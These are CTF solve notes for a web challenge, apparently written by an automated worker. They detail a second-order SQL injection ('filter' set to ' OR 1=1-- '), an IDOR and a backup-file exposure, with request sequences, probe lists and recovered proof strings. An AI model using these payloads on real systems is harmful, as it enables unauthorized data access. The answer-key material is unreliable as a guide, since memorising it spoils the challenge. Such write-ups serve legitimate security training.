---
day: 12
slug: "ask-again-later"
lane: web-exploitation
modes: [single_solve, time_trial, mastery]
has_solve_py: [single_solve, time_trial, mastery]
tags: []  # TODO: fill in descriptive kebab-case bug-class/technique tags, e.g. [reflected-xss, idor]
---

## single_solve

# web-exploitation-day-12-ask-again-later / single_solve

Status: **SOLVED**. Proof: `proof_3139b1e361f94b19aedd2d10232df691`.

## Solution

The vulnerable field name is **`filter`** (not `question`/`note`/any of the other
content-themed words tried earlier), combined with a classic boolean-OR SQL
injection payload. `filter` is presumably merged into a later query's WHERE
clause unsanitized (second-order: the value is stored safely on `POST
/submit-e89284`, then re-used unescaped when `GET /result-725403` builds its
query) — hence "plant your question inside the data and come back later" and
`"effect":"delayed_query_revealed_private_row"`.

```
POST /submit-e89284
{"filter": "' OR 1=1-- "}
-> 201 {"ok":true,"saved":true}

GET /result-725403
-> 200 {"rows":["Ordinary workspace note","proof_3139b1e361f94b19aedd2d10232df691"],
        "effect":"delayed_query_revealed_private_row"}
```

Confirmed stable on a repeat `GET /result-725403` (see
`evidence/result_confirmed_proof.json`). Found via `solve.py`'s evidence-led
field-name x SQLi-payload matrix (24 candidate field names x 8 payload shapes,
all previously justified individually in earlier testing below) — `filter` was
one of the SQL-clause-themed key names added after the initial round of generic
content-word field names came up empty.

Everything below this line is the exploration history that led here (kept for
the record; the previous "BLOCKED" framing has been superseded by the result
above).

## Target

- Target 1: `https://2fe090c0a0dfcdd9a148253df0ca53f6676b028f90fa5485.2026.huntress.ctf.games/`
- answer_id: `proof-1` ("Recover the proof from Target 1.")
- App: Sinatra ("Report Replay"), no cookies/sessions ever set, Cloudflare-fronted.

## Clues (`GET /api/clues`)

```json
{"framework":"Sinatra","feature_route":"/submit-e89284","secondary_route":"/result-725403","current_role":"analyst"}
```
Stable across repeated calls (not rotating).

## Root page hints

- "A small, complete training app with one deliberately isolated security boundary."
- "Native routing and server-side authorization are active in this application." — read as: routing/authz are *working correctly* here, i.e. likely not the bug.
- "Standard workspace access. Administrative actions should remain outside this role." (role=analyst)
- "The workspace notes expose ordinary identifiers and feature routes; the protected effect still requires a valid proof of concept."
- Prompt: "No answer right now? Fine. Plant your question inside the data and come back later — the delayed echo tells all." — strongly suggests second-order/stored injection: POST plants data, a later GET's query uses it unsafely.

## Observed route behavior

- `GET /submit-e89284` -> 405 `{"error":"post_required"}` (route exists, POST-only).
- `POST /submit-e89284` with **any** JSON object body (empty `{}`, arbitrary keys, nested
  hashes, arrays-as-values, huge 2MB strings, integers, batch/array wrapper shapes) ->
  always `201 {"ok":true,"saved":true}` (constant 24-byte body, no observable variation).
- `POST /submit-e89284` with a **non-object top-level JSON** (`[1,2,3]`, `123`, `null`,
  `"string"`) -> `500 Internal Server Error` (generic, no stack trace / prod error page).
  This is consistent with server code doing a Hash-only operation (e.g. `data.merge(...)`
  or `data.keys`) on the parsed body — i.e. the body is treated as a hash of attributes,
  not validated against a specific schema.
- `GET /result-725403`:
  - **Very first call of the attempt** (before any POST) returned
    `{"rows":["Ordinary workspace note"],"effect":"delayed_query_revealed_private_row"}`.
  - **Every single call since** (100+ requests, across ~40 minutes of testing) returned
    exactly `{"rows":[],"effect":"delayed_query_revealed_private_row"}` — a constant
    57-byte body — regardless of what was POSTed beforehand.
  - Only `GET` is defined on this path (`POST`/`DELETE` -> 404 "Sinatra doesn't know this
    ditty" default page, confirming no handler for those methods); `/result-<other-id>`
    for several numeric/alpha ids -> 404 (route suffix is a strict per-attempt token, not
    a general parameterized id — ruled out plain IDOR via suffix guessing).
  - Query-string overrides (`?q=`, `?question=`, `?search=`, `?filter=`, `?text=`) have no
    effect; the route takes no live input itself.

## What was tried against `/submit-e89284` (all gave identical empty `/result`)

- Field-name sweep for the "question"/content key (16 candidates: question, text, note,
  message, content, body, query, input, data, report, ask, prompt, comment, value, title,
  subject) with a unique marker string — **none** of them caused the marker to be echoed
  back anywhere in `/result`, so the actual field read by the server (if any) was never
  identified by self-echo.
- Classic boolean/group-closing SQLi payloads on `question` (`' OR '1'='1`, `') OR ('1'='1`,
  `%' OR '1'='1`, `') OR ('1'='1'-- -`, unquoted `1 OR 1=1`, `1=1`) — day-19-style payloads,
  no effect, no SQL error ever surfaced (even with badly unbalanced quotes).
- NoSQL-operator-style injection (`{"$ne":null}`, `{"$regex":".*"}`, `{"$gt":""}`,
  `{"$where":"1==1"}`) as the `question` value — no effect.
- Mass-assignment probes aimed at a hypothetical visibility/role column, both as a fresh
  record and pinned to `id:1`/`id:0` (`visibility`, `status`, `private`, `is_private`,
  `access`, `level`, `visible`, `public`, `hidden`, `restricted`, `approved`, `published`) —
  no effect.
- Role-escalation probes: JSON body `role`/`current_role` fields, `X-Role` header, cookies
  (`role=admin`, `current_role=admin`, `session=admin`) — `current_role` from `/api/clues`
  never changed from `analyst`.
- Delay/timestamp manipulation fields (`created_at`, `timestamp`, `delay`, `delay_seconds`,
  `available_at`, `revealed_at`, `wait`, `ready`, `delayed`, `pending`) — no effect.
- Encoding variants: JSON body, form-urlencoded body, query-string params, nested
  `report[question]=...` / `question[text]=...` form keys, `{"data":...}` / `{"report":
  {"question":...}}` nesting — no effect.
- Integer-typed `question`/`id` values (1, 2) guessing a 2-row demo schema — no effect.
- Genuine wall-clock delay: submitted one clean payload, then polled `/result` with **zero
  other requests** for 313 seconds straight — response never changed. Rules out a simple
  "answer appears automatically after N seconds" mechanism (at least within ~5 minutes).
- Race-condition probe: fired 15 concurrent `GET /result` requests immediately after one
  `POST /submit` — all 15 returned the same static empty body; no TOCTOU window caught.
- Large-payload probe: 2MB `question` string — accepted fine (`201 ok:true`, ~1.1s, mostly
  upload time), no SQL-length-limit error — weak evidence against raw unescaped SQL string
  concatenation (parameterized storage is more consistent with this and with the total lack
  of any SQL syntax error across all quote-breaking attempts).
- Route-shape probes: trailing slash on both routes -> 404; `/result-725403.json` -> 404;
  `/submit-e89284` via PUT/DELETE/PATCH -> Sinatra's generic unmatched-route page (confirms
  GET+POST are the only defined methods on `/submit-e89284`, GET-only on `/result-725403`).
- Header/trust probes: `X-Forwarded-For: 127.0.0.1`, `Accept: text/html` on `/result` — no
  effect.
- Noted but ruled out as a dead end: navigating to `/api/clues` (and also `/submit-e89284`,
  `/result-725403`) **in a real browser** (full navigation headers — `Referer` set,
  `Sec-Fetch-Mode: navigate`, `Sec-Fetch-Dest: document`) gets blocked with a Cloudflare
  edge `403` (`text/plain`, 9-byte body, i.e. "Forbidden"). Reproduced with curl by adding
  the same headers; it 403s on *all three* routes identically, confirming it's a blanket
  Cloudflare bot/navigation rule at the edge, not an app-level check — plain API-style
  requests (no `Referer`, no `Sec-Fetch-Mode`) are never affected and were used throughout.

## Why this is recorded as blocked rather than guessed

- `/result-725403`'s body has been 100% identical and content-independent across every
  probe attempted after the very first call of the attempt, including a clean, uninterrupted
  5-minute wait and a concurrent-request race probe. No single lever found changes it.
- No SQL/application error was ever observed from `/submit-e89284` for any string/quote
  payload (only for wrong JSON *type* at the top level), so there is no error-oracle to
  iteratively refine an injection against, and blindly sweeping further field names/payloads
  would be exactly the "guess cycling" / "blind wordlist" the worker contract prohibits.
- No proof_<hex> string (the expected answer format per `docs/web-worker-lessons.md`) was
  ever observed anywhere in any response.

## Next steps if resumed

- A fresh target (e.g. via `time_trial`, once reached in order) would let the *very first*
  `GET /result` call be tested with a malicious payload already planted beforehand (this
  attempt's first call was made before any exploit attempt, only establishing the
  `"Ordinary workspace note"` baseline).
- Worth checking whether the single public baseline row ("Ordinary workspace note") is
  consumed/one-shot regardless of `/submit` activity — untested cleanly since this target's
  first call already happened before that could be isolated.
- **Checked: `wk.py begin time_trial` explicitly refuses** ("blocked: prerequisite is not
  confirmed CORRECT: web-exploitation-day-12-ask-again-later") — the pipeline enforces strict
  mode ordering per-family, so a "fresh target via time_trial" is not reachable without first
  getting this attempt to CORRECT. This attempt is the only one available to work with.

## 2026-10-24 takeover: additional exhaustive negative testing (still blocked)

Picked up after a pane-exit takeover. Re-verified `wk.py status --live`: single_solve still
`working`/`active`, no prior submission made (none should be, since no evidence-backed answer
was ever found). Ran the previous worker's own prepared-but-unexecuted scripts
(`exp.py` union/union2 modes, `poll_err.py` err mode) plus my own additional probes, all against
this same live attempt (cannot get a fresh one — see above). Every test below used the single
assigned target origin only, paced ≥0.5–0.8s apart, small bounded counts.

**All of the following produced `{"rows":[],"effect":"delayed_query_revealed_private_row"}` or
no measurable change, same as the existing record above:**

- `exp.py union`: single-column self-marker UNION SQLi (`' UNION SELECT 'ZZ9MARK'-- `) tried
  across 16 candidate field names (question, q, note, text, content, body, data, message,
  report, query, input, value, title, name, id, ask), each followed by 4 fresh GETs.
- `exp.py union2`: 2-column and 3-column UNION variants, numeric-context UNION
  (`0 UNION SELECT ...`), classic `' OR 1=1--`, a guessed-column `' OR visibility='private'--`,
  parenthesis-closing, and double-quote variants — all on `question`.
- `poll_err.py err`: differential body-shape probe (18 shapes). Notable finding: a
  **syntactically invalid JSON body** (`{not json`, missing closing brace/quotes) returns
  `201 {"ok":true,"saved":true}` — same as a valid empty object. This means the parse step
  likely does `JSON.parse(body) rescue {}` (silently defaulting to an empty hash on a parse
  error) rather than surfacing any parser error; it is *not* evidence of a usable injection
  since an unparseable body can't carry attacker-controlled keys/values through to storage.
  Only genuinely-parsed-but-non-Hash top-level JSON (array/number/string/null/bool) still 500s,
  confirming the type check is on the *parsed* value's class, as previously recorded.
- Direct self-referential keys matching the `/result` response schema itself: `{"rows": [...]}`,
  `{"effect": "..."}` — no effect; `effect` is very likely a hardcoded flavor-text constant in
  the route's response, not dynamically computed from stored data.
- SQL-clause-themed key names suggested by the literal word "query" in the `effect` string:
  `filter`, `where`, `sql`, `clause`, `condition`, each set to `"1=1"` — no effect.
- `role: "admin"` as a submitted body field (distinct from the earlier role-escalation test,
  which only checked whether `/api/clues`'s `current_role` changed) — checked `/result`
  directly afterward — no effect.
- Header-based trust probes on `GET /result-725403` itself: `X-Role: admin`, `Role: admin`,
  `X-Current-Role: admin`, `Authorization: Bearer admin`, `X-Internal: true`, `X-Debug: true`
  — no effect on the response body.
- Query-string parameters on the **write** endpoint (untested surface; prior query-string
  tests were only against `/result`): `/submit-e89284?visibility=public`,
  `?approved=true`, `?role=admin`, `?public=true` — no effect.
- Form-urlencoded body (`application/x-www-form-urlencoded`) carrying a classic boolean
  injection string (`') OR ('1'='1`) under key `question` — no effect (same null result as the
  earlier form-encoding field-name sweep, now confirmed with actual injection content too).
- Exact-byte replay: POSTing the identical raw JSON body twice in a row — no effect (rules out
  a duplicate-detection/idempotency toggle bug).
- `OPTIONS` on `/`, `/api/clues`, `/submit-e89284`, `/result-725403` — all 404 (method not
  recognized by Sinatra's router at all, no `Allow` header leak).
- `/api/clues` with `Accept: text/plain` and with a different `User-Agent` — identical content,
  no extra/hidden fields, `current_role` still always `"analyst"`.
- Guessed sibling routes derived from the app's own name/theme ("Report Replay"): `/replay`,
  `/report`, `/reports`, `/notes`, `/review`, `/queue`, `/private`, `/approve`, `/admin`,
  `/export` — all `404 {"error":"not_found"}`. (Recorded as a small, theme-derived set, not a
  wordlist sweep; not repeated or expanded further per the no-blind-wordlist policy.)
- Extended timing: submitted a clean marker, then waited an additional cumulative ~110s with
  periodic polling (on top of the prior worker's uninterrupted clean 313s wait) — no change.
  Across the full session (both workers combined), `/result` has now been polled well over
  150 times across more than an hour of wall-clock time with zero variation, which is strong
  evidence against any periodic/batched background-job reveal within a plausible training-app
  timescale.
- Cloudflare response headers on `/result-725403` show no `cf-cache-status`/`age` (and a fresh
  `cf-ray` per request), ruling out edge-cache staleness/deception as the cause of the static
  body.

### Conclusion

No input on any tested axis (JSON body field name/value/type/encoding, query string on either
route, HTTP header, timing, exact byte-for-byte replay, or guessed alternate route) produces any
observable change in `/result-725403`'s response, which has been `{"rows":[],...}` on every call
since the second call of this attempt ever made. No SQL/application error has ever been surfaced
from either route for any payload (only the documented generic 500 for non-Hash top-level JSON on
`/submit`, which is a type check, not an injection oracle). No `proof_<hex>` string, nor any
content beyond the two fixed JSON shapes, has been observed anywhere.

This is recorded as **blocked**, not guessed: no answer can be derived from current evidence
without inventing or guessing a flag, which the worker contract prohibits. `wk.py begin
time_trial` was attempted and the tool itself refused to start it until this mode reads
CORRECT, so the family cannot progress past this point without either a working exploit for
this specific attempt or operator intervention (e.g. a legitimate retry, which is outside this
worker's authority to use for probing).

## time_trial

# web-exploitation-day-12-ask-again-later / time_trial

Status: **SOLVED**. Proof: `proof_2adb09d9b2bd434b9cb7df6191f026f7`.

## Target

- Target 1: `https://5185cd7f1fe25fa46752fcb371ea71ce8a1190603030acfd.2026.huntress.ctf.games/`
- `GET /api/clues` -> `{"framework":"Sinatra","feature_route":"/submit-8ac429","secondary_route":"/internal-c75be3","current_role":"analyst"}`
  (route suffixes and the secondary route's name are per-attempt random; this
  attempt's secondary route is named `/internal-c75be3`, unlike single_solve's
  `/result-*` — always read it from the current `/api/clues` response, never
  hard-code a route name.)

## Exploit (ported from single_solve, see its NOTES.md for the full derivation)

Second-order injection: `POST` a JSON object with key **`filter`** (not any of
the obvious content-word field names like `question`/`note`/`text`) and a
classic boolean-OR SQL payload. The value is stored safely, then later reused
unsanitized by the secondary route's query, revealing the private proof row
alongside the public demo note.

```
POST /submit-8ac429
{"filter": "' OR 1=1-- "}
-> 201 {"ok":true,"saved":true}

GET /internal-c75be3
-> 200 {"rows":["Ordinary workspace note","proof_2adb09d9b2bd434b9cb7df6191f026f7"],
        "effect":"delayed_query_revealed_private_row"}
```

Confirmed stable on a repeat GET of the secondary route (two identical
responses, see `evidence/`). Worked on the first try since the field name and
payload shape were already known from `single_solve`.

## mastery

# web-exploitation-day-12-ask-again-later / mastery

Status: **SOLVED**. All 3 targets classified independently (per
`docs/web-worker-lessons.md`: mastery mixes earlier curriculum bug classes, do
not assume every target repeats the family's own bug).

- `proof-1` (Target 1, "Tiny Uptime"): backup exposure -> `proof_6bb84e7c5f4649a7a371e7ec414131d9`
- `proof-2` (Target 2, "Case Crate"): IDOR -> `proof_a3d9d78b56004fef9fa47fa5fb56c00c`
- `proof-3` (Target 3, "Ask Again Later"): second-order SQLi (this family's own
  bug, see `single_solve`/`time_trial` NOTES.md) -> `proof_978480d8827a4cd1b5dcc33b6d693840`

`questions[].artifact` ("Target 1"/"Target 2"/"Target 3") mapped 1:1 to
`targets[].id` and `answer_ids` (`proof-1`/`proof-2`/`proof-3`) in `start.json`.

## Target 1 — backup exposure (`proof-1`)

- `https://f8ebc79d0220171d1e0357937ef614328797add6e10c7c0c.2026.huntress.ctf.games/`
- Root page has no `/api/clues` (404); HTML comment: `deployment note: remember
  to review crawler policy before launch`.
- `GET /robots.txt` -> `Disallow: /snapshots-3f8ca/`.
- `GET /snapshots-3f8ca/` -> `200`, open directory listing naming
  `environment-copy-efa381.json.bak` and `release-notes.txt`.
- `GET /snapshots-3f8ca/environment-copy-efa381.json.bak` ->
  `{"environment":"production","support_note":"proof_6bb84e7c5f4649a7a371e7ec414131d9"}`.
  Full evidence in `evidence/target1_backup.txt`.

## Target 2 — IDOR (`proof-2`)

- `https://277f723fcb57ba3636870d1ce2c9f3e5822af84f8196e4c5.2026.huntress.ctf.games/`
- `GET /api/clues` -> `401 {"error":"session_required","login":"/"}` (no
  `feature_route`/`secondary_route` clues here — this is not the family's own
  second-order-SQLi class).
- `GET /` sets a `case_session` cookie and shows "Signed in as Riley" with her
  own cases (7824, 6525, 2778) and links to `/briefs/<id>` and `/api/events`.
- `GET /api/events` (same session) discloses a foreign case in the activity
  feed: `{"case_id":16475,"owner":"executive","action":"Case reassigned
  outside your workspace","visibility":"reference_only"}`.
- `GET /briefs/7824` (one of Riley's own cases) has an inline
  `<script>fetch("/api/briefs/7824")...` revealing the real JSON API template:
  `/api/briefs/<id>`.
- `GET /api/briefs/16475` (same `case_session` cookie, the foreign id from the
  feed) -> `200
  {"id":16475,"owner":"executive","title":"Payroll incident","status":"restricted","note":"proof_a3d9d78b56004fef9fa47fa5fb56c00c"}`.
  Confirmed stable on repeat GET. Full evidence in `evidence/target2_idor.txt`.

## Target 3 — second-order SQLi (`proof-3`, this family's own bug)

- `https://af2f51353daefd0def464a799688f2eeb09a01bc757ecdff.2026.huntress.ctf.games/`
- `GET /api/clues` -> `{"framework":"Sinatra","feature_route":"/submit-5af869","secondary_route":"/callback-36f43b","current_role":"analyst"}`
  (route names/suffixes are per-attempt random, read fresh each time — this
  attempt's secondary route is named `/callback-36f43b`, not `/result-*`).
- Exploit derived and confirmed in `single_solve`/`time_trial`: `POST
  /submit-5af869 {"filter": "' OR 1=1-- "}` -> `201`, then `GET
  /callback-36f43b` -> `{"rows":["Ordinary workspace note","proof_978480d8827a4cd1b5dcc33b6d693840"],"effect":"delayed_query_revealed_private_row"}`.
  Confirmed stable on repeat GET. Full evidence in
  `evidence/target3_second_order_sqli.txt`.

## Reusable solver

`solve.py` has `classify_and_recover(base)` which dispatches by evidence
(`/api/clues` shape -> second-order SQLi; `401 session_required` or an
`/api/events`+`/briefs/` root page -> IDOR; otherwise -> robots.txt-driven
backup exposure), plus the three individual `rec_*` recoverers. Verified
end-to-end against this attempt's three live targets, reproducing all three
proofs above exactly.
